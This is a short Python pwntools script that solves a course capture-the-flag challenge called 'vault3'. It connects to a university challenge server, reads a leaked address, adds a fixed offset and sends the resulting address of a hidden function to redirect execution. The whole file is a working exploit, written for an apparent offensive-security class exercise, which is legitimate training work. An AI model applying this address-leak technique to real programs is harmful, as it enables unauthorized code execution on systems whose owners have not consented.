from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "vault3"
PORT = 1233
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

#Secret Offset
secretOffset = "0x1269"

#find base address
print(p.recvuntil(b"post-it note: "))
baseAddress = p.recvuntil("\n").strip()
#print(str(baseAddress))

#reverse for LSB
baseAddress = baseAddress[::-1]
#print(str(baseAddress))

#convert to hex
baseAddress = "0x" + baseAddress.hex()
#print(baseAddress)

#find vault address
secretAddress = hex(int(baseAddress, 16) + int(secretOffset, 16))
#print(secretAddress)

#go to last input
print(p.recvuntil(b"> "))
p.sendline(secretAddress.encode())
p.interactive()
